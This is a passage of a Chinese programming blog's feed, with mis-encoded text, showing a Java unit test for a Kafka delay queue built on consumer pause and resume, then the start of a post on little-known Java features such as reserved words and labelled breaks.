&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@SpringBootTest
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">DelayQueueTest&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> KafkaConsumer&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> consumer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> KafkaProducer&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> producer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">volatile&lt;/span> Boolean exit &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> Object lock &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Object();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> String servers &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @BeforeEach
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">initConsumer&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Properties props &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Properties();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">BOOTSTRAP_SERVERS_CONFIG&lt;/span>, servers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">GROUP_ID_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;d&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">ENABLE_AUTO_COMMIT_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;false&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">AUTO_OFFSET_RESET_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;earliest&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">ISOLATION_LEVEL_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;read_committed&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">MAX_POLL_INTERVAL_MS_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;5000&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> KafkaConsumer&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>(props, &lt;span style="color:#ff79c6">new&lt;/span> StringDeserializer(), &lt;span style="color:#ff79c6">new&lt;/span> StringDeserializer());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @BeforeEach
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">initProducer&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Properties props &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Properties();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ProducerConfig.&lt;span style="color:#50fa7b">BOOTSTRAP_SERVERS_CONFIG&lt;/span>, servers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ProducerConfig.&lt;span style="color:#50fa7b">VALUE_SERIALIZER_CLASS_CONFIG&lt;/span>, StringSerializer.&lt;span style="color:#50fa7b">class&lt;/span>.&lt;span style="color:#50fa7b">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ProducerConfig.&lt;span style="color:#50fa7b">KEY_SERIALIZER_CLASS_CONFIG&lt;/span>, StringSerializer.&lt;span style="color:#50fa7b">class&lt;/span>.&lt;span style="color:#50fa7b">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> producer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> KafkaProducer&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>(props);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @Test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">testDelayQueue&lt;/span>() &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> JsonProcessingException, InterruptedException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String topic &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;delay-minutes-1&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> topics &lt;span style="color:#ff79c6">=&lt;/span> Collections.&lt;span style="color:#50fa7b">singletonList&lt;/span>(topic);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">subscribe&lt;/span>(topics);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Timer timer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Timer();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timer.&lt;span style="color:#50fa7b">schedule&lt;/span>(&lt;span style="color:#ff79c6">new&lt;/span> TimerTask() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @Override
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">run&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (lock) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">resume&lt;/span>(consumer.&lt;span style="color:#50fa7b">paused&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#50fa7b">notify&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, 0, 1000);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">do&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (lock) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConsumerRecords&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> consumerRecords &lt;span style="color:#ff79c6">=&lt;/span> consumer.&lt;span style="color:#50fa7b">poll&lt;/span>(Duration.&lt;span style="color:#50fa7b">ofMillis&lt;/span>(200));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (consumerRecords.&lt;span style="color:#50fa7b">isEmpty&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#50fa7b">wait&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">boolean&lt;/span> timed &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">for&lt;/span> (ConsumerRecord&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> consumerRecord : consumerRecords) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> timestamp &lt;span style="color:#ff79c6">=&lt;/span> consumerRecord.&lt;span style="color:#50fa7b">timestamp&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TopicPartition topicPartition &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> TopicPartition(consumerRecord.&lt;span style="color:#50fa7b">topic&lt;/span>(), consumerRecord.&lt;span style="color:#50fa7b">partition&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (timestamp &lt;span style="color:#ff79c6">+&lt;/span> 60 &lt;span style="color:#ff79c6">*&lt;/span> 1000 &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> System.&lt;span style="color:#50fa7b">currentTimeMillis&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String value &lt;span style="color:#ff79c6">=&lt;/span> consumerRecord.&lt;span style="color:#50fa7b">value&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectMapper objectMapper &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectMapper();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNode &lt;span style="color:#ff79c6">=&lt;/span> objectMapper.&lt;span style="color:#50fa7b">readTree&lt;/span>(value);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeTopic &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;topic&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String appTopic &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>, appKey &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>, appValue &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (jsonNodeTopic &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appTopic &lt;span style="color:#ff79c6">=&lt;/span> jsonNodeTopic.&lt;span style="color:#50fa7b">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (appTopic &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeKey &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;key&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (jsonNodeKey &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appKey &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeValue &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;value&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (jsonNodeValue &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appValue &lt;span style="color:#ff79c6">=&lt;/span> jsonNodeValue.&lt;span style="color:#50fa7b">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// send to application topic&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ProducerRecord&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> producerRecord &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ProducerRecord&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>(appTopic, appKey, appValue);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> producer.&lt;span style="color:#50fa7b">send&lt;/span>(producerRecord).&lt;span style="color:#50fa7b">get&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// success. commit message&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OffsetAndMetadata offsetAndMetadata &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> OffsetAndMetadata(consumerRecord.&lt;span style="color:#50fa7b">offset&lt;/span>() &lt;span style="color:#ff79c6">+&lt;/span> 1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>TopicPartition, OffsetAndMetadata&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> metadataHashMap &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> HashMap&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> metadataHashMap.&lt;span style="color:#50fa7b">put&lt;/span>(topicPartition, offsetAndMetadata);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">commitSync&lt;/span>(metadataHashMap);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">catch&lt;/span> (ExecutionException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">pause&lt;/span>(Collections.&lt;span style="color:#50fa7b">singletonList&lt;/span>(topicPartition));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">seek&lt;/span>(topicPartition, consumerRecord.&lt;span style="color:#50fa7b">offset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timed &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">pause&lt;/span>(Collections.&lt;span style="color:#50fa7b">singletonList&lt;/span>(topicPartition));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">seek&lt;/span>(topicPartition, consumerRecord.&lt;span style="color:#50fa7b">offset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timed &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (timed) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#50fa7b">wait&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">!&lt;/span>exit);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ®µç¨‹åºæ˜¯åŸºäºSpringBoot &lt;code>2.4.4&lt;/code>ç‰ˆæœ¬å’Œ kafka-client &lt;code>2.7.0&lt;/code>ç‰ˆæœ¬ç¼–å†™çš„ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œéœ€è¦ä¿®æ”¹ç§æœ‰å˜é‡&lt;code>servers&lt;/code>ä¸ºkafka brokerçš„åœ°å€ã€‚&lt;/p></description></item><item><title>Javaçš„å¥‡æŠ€æ·«å·§</title><link>https://www.typesafe.cn/posts/java-unexpected-features/</link><pubDate>Sat, 13 Mar 2021 13:49:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-unexpected-features/</guid><description>&lt;p>&lt;strong>Java&lt;/strong>æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—æœºç¼–ç¨‹è¯­è¨€ã€é¢å‘å¯¹è±¡ã€æ³›å‹ç¼–ç¨‹çš„ç‰¹æ€§ï¼Œå¹¿æ³›åº”ç”¨äºä¼ä¸šçº§Webåº”ç”¨å¼€å‘å’Œç§»åŠ¨åº”ç”¨å¼€å‘ã€‚&lt;/p>
&lt;p>1995å¹´3æœˆ23æ—¥&lt;strong>Sun&lt;/strong>å…¬å¸å‘å¸ƒäº†&lt;strong>Java&lt;/strong>ï¼Œè‡³ä»Šå·²æœ‰è¿‘26å¹´ï¼Œå¯ä»¥è¯´æ˜¯ä¸€é—¨ååˆ†æˆç†Ÿçš„å¼€å‘è¯­è¨€äº†ï¼Œä½†åœ¨æŸäº›ä¸ä¸ºäººçŸ¥çš„åœ°æ–¹å­˜åœ¨ç€ä¸€äº›æ„æ–™ä¹‹å¤–çš„ç‰¹æ€§ã€‚&lt;/p>
&lt;h3 id="javaçš„ä¿ç•™å…³é”®å­—-gotoå’Œconst">Javaçš„ä¿ç•™å…³é”®å­— gotoå’Œconst&lt;/h3>
&lt;p>åœ¨&lt;strong>Java&lt;/strong>é‡Œé¢æ²¡æœ‰&lt;code>goto&lt;/code>è¿™ä¸ªåŠŸèƒ½ï¼Œä½†å®ƒä½œä¸ºä¿ç•™å­—æ˜¯æ— æ³•å½“åšå˜é‡æ¥ä½¿ç”¨çš„ï¼Œ&lt;code>const&lt;/code>ä¹Ÿæ˜¯åŒæ ·ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#ff79c6">goto&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">const&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šé¢è¿™ä¸¤è¡Œä»£ç çš„å†™æ³•å­˜åœ¨é—®é¢˜ï¼Œæ— æ³•æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚&lt;/p>
&lt;h3 id="javaæ ‡ç­¾label">Javaæ ‡ç­¾Label&lt;/h3>
&lt;p>ä¸Šé¢è¯´äº†åœ¨&lt;strong>Java&lt;/strong>é‡Œé¢æ²¡æœ‰&lt;code>goto&lt;/code>è¿™ä¸ªåŠŸèƒ½ï¼Œä½†ä¸ºäº†å¤„ç†å¤šé‡å¾ªç¯å¼•å…¥äº†Labelï¼Œç›®çš„æ˜¯ä¸ºäº†åœ¨å¤šé‡å¾ªç¯ä¸­æ–¹ä¾¿çš„ä½¿ç”¨ break å’Œcoutinue ï¼Œä½†å¥½åƒåœ¨å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥ç”¨ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">outerLoop&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;I&amp;#39;m the outer loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd">int&lt;/span> i &lt;span style="color:#ff79c6">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;I am the inner loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		i&lt;span style="color:#ff79c6">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">if&lt;/span> (i &lt;span style="color:#ff79c6">&amp;gt;=&lt;/span> 3) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#ff79c6">break&lt;/span> outerLoop;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;Complete the loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// è¾“å‡º&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I&amp;#39;m the outer loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Complete the loop
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// è¾“å‡º&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
